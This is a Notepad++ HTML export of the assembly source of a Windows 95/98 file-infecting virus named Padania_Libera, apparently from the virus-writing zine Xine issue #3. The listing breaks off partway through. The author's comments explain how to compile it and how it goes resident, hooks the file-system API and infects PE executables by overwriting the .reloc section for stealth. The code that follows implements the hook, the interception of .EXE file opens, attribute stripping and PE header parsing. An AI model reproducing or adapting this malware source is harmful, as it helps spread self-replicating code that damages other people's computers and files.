<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #3 - Phile 202 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Name    : Padania_Libera</span><span class="sc0">
</span><span class="sc1">; Virus Author  : b0z0/iKX</span><span class="sc0">
</span><span class="sc1">; Origin        : Padania, 1998</span><span class="sc0">
</span><span class="sc1">; Platform      : Win 95/98</span><span class="sc0">
</span><span class="sc1">; Target        : PE files</span><span class="sc0">
</span><span class="sc1">; Compiling     : TASM 5.0 and TLINK 5.0 should be used</span><span class="sc0">
</span><span class="sc1">;                       tasm32 /ml /m3 padlib,,;</span><span class="sc0">
</span><span class="sc1">;                       tlink32 /Tpe /aa /c /v padlib,padlib,,import32.lib,</span><span class="sc0">
</span><span class="sc1">;                 And then set the PE header so the data section will be loaded</span><span class="sc0">
</span><span class="sc1">;                 at C0000000.</span><span class="sc0">
</span><span class="sc1">; Goodies       : This is a TSR PE infector that goes resident by coping itself</span><span class="sc0">
</span><span class="sc1">;                 in the unused 1000h at 0c0000000h and then hooks the VxD</span><span class="sc0">
</span><span class="sc1">;                 functions. So there isn't any need to search the adresses</span><span class="sc0">
</span><span class="sc1">;                 of the APIs. Thanx to Murkry/IkX for the help for this part</span><span class="sc0">
</span><span class="sc1">;                 of the virus!</span><span class="sc0">
</span><span class="sc1">;                 As for file infection the virus can actually infect the file</span><span class="sc0">
</span><span class="sc1">;                 in three simillar ways, depending on the file structure. If</span><span class="sc0">
</span><span class="sc1">;                 the victim doesn't have a .reloc section, then the virus will</span><span class="sc0">
</span><span class="sc1">;                 just add a new object and put the EIP in PE to point on it.</span><span class="sc0">
</span><span class="sc1">;                 If the victim has a .reloc section the virus will overwrite</span><span class="sc0">
</span><span class="sc1">;                 this section with its code and change the PE header so it</span><span class="sc0">
</span><span class="sc1">;                 doesn't think anymore about the fixup section. After this</span><span class="sc0">
</span><span class="sc1">;                 the virus will have two ways of gaining control to that</span><span class="sc0">
</span><span class="sc1">;                 position. One is the simple to change the EIP in the PE</span><span class="sc0">
</span><span class="sc1">;                 header, while the second is to put a JMP from the body</span><span class="sc0">
</span><span class="sc1">;                 of the program to the virus. To find a suitable position</span><span class="sc0">
</span><span class="sc1">;                 where to put the JMP the virus will use the original .reloc</span><span class="sc0">
</span><span class="sc1">;                 section that contains useful data to find suitable</span><span class="sc0">
</span><span class="sc1">;                 instructions. The virus will put the JMP near the original</span><span class="sc0">
</span><span class="sc1">;                 EIP, so it is very probable it will be executed (thus</span><span class="sc0">
</span><span class="sc1">;                 putting the JMP in a random position should not activate the</span><span class="sc0">
</span><span class="sc1">;                 virus too often).</span><span class="sc0">
</span><span class="sc1">;                 By overwriting the .reloc it is very probable that the</span><span class="sc0">
</span><span class="sc1">;                 filesize of the infected file won't change (very often the</span><span class="sc0">
</span><span class="sc1">;                 dimension of the .reloc is anyway &gt; of the virus length)</span><span class="sc0">
</span><span class="sc1">;                 thus making this also a sorta stealth add-on.</span><span class="sc0">
</span><span class="sc1">;                 Please check the article about Win95/98/32 ideas for more</span><span class="sc0">
</span><span class="sc1">;                 explanations and hints about this method.</span><span class="sc0">
</span><span class="sc1">; Special thanx : to Murkry/IkX for his help with Win95/98/32 stuff!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">


</span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00400067h</span><span class="sc0">
</span><span class="sc5">UniToBCSPath</span><span class="sc0">                    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00400041h</span><span class="sc0">
</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00400032h</span><span class="sc0">

</span><span class="sc5">peheader</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">starthigh</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">                                   </span><span class="sc1">;the data area</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c0001000h</span><span class="sc0">          </span><span class="sc1">; starting scan location</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">               </span><span class="sc1">; how much bytes to check</span><span class="sc0">

</span><span class="sc5">vmm_start_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0c0002000h</span><span class="sc0">          </span><span class="sc1">; should be &gt; of this</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">bad_entry</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0c0020000h</span><span class="sc0">          </span><span class="sc1">; and not &gt; than this limit</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">bad_entry</span><span class="sc0">               </span><span class="sc1">; to prevent GPFs</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc12">' MMV'</span><span class="sc0">      </span><span class="sc1">; got it?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_chain</span><span class="sc0">

</span><span class="sc5">bad_entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">vmm_start_loop</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RetToHost</span><span class="sc0">

</span><span class="sc5">got_chain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">003ch</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">origifs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vxdoff</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">NewHandler</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int20_place</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc2">020cdh</span><span class="sc0">

</span><span class="sc5">RetToHost</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">chktsr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NewHandler</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vxdoff</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vxdoff</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">origifs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12345678h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; restore orig ifs</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">NewFShook</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_vxdcall</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldfsd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">virus_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'Padania_Libera'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">make_vxdcall</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">back</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vxdcall</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">int20_place</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">vxdcall</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int20_place</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc2">020cdh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">     </span><span class="sc1">; push immediate dd</span><span class="sc0">
</span><span class="sc5">back</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">author_orig</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'by -b0z0/iKX-'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">vxdcall_io</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_vxdcall</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NewFShook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000020h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">chktsr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">letOrginal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">00000024h</span><span class="sc0">           </span><span class="sc1">; open file</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">letOrginal</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">chktsr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Primary Data buffer of the IOREQ</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">noneeddriveletter</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                   </span><span class="sc1">; create the c:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">noneeddriveletter</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">     </span><span class="sc1">; push imm dd 00</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">     </span><span class="sc1">; push imm dd ff</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get input filename</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">UniToBCSPath</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_vxdcall</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">],</span><span class="sc3">"EXE."</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exitvvxd_noatt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                       </span><span class="sc1">; get attribs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exitvvxd_noatt</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; attribs on the stack</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; delete attribs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exitvvxd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d500h</span><span class="sc0">                   </span><span class="sc1">; open file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vxdoff</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">exitvvxd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; file handle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03ch</span><span class="sc0">                       </span><span class="sc1">; read pointer to PE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d600h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">peptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">                        </span><span class="sc1">; read 1kb of PE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">04550h</span><span class="sc0">           </span><span class="sc1">; is PE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">closefile</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">],</span><span class="sc12">'0z0b'</span><span class="sc0"> </span><span class="sc1">; already infected?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">closefile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d800h</span><span class="sc0">                      </span><span class="sc1">; get file size in eax</span><span class="sc0">
